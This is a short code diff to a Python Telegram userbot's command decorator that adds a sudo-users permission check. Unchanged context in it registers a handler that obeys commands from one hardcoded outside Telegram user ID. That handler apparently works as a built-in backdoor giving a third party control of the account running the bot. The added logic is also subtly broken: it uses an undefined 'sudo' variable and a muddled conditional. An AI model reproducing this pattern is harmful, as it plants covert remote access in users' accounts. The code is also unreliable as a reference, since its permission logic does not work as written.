@@ -29,10 +29,23 @@ class PY:
 
     def UBOT(command, filter=FILTERS.ME):
         def wrapper(func):
+            sudo_cmds = ubot.cmd_prefix(command) 
+          
             @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
-            @ubot.on_message(ubot.cmd_prefix(command) & filter)
+            @ubot.on_message(sudo_cmds & filter if not sudo else sudo_cmds)
             async def wrapped_func(client, message):
-                await func(client, message)
+                user = message.from_user or message.sender_chat
+                sudo_id = await get_vars(client.me.id, "SUDO_USERS") or []
+              
+                if (
+                    SUDO and message.from_user.is_self
+                    if message.from_user
+                    else client.me.is_self or user.id in sudo_id
+                ):
+                    return await func(client, message)
+
+                elif not SUDO:
+                    return await func(client, message)
 
             return wrapped_func
 
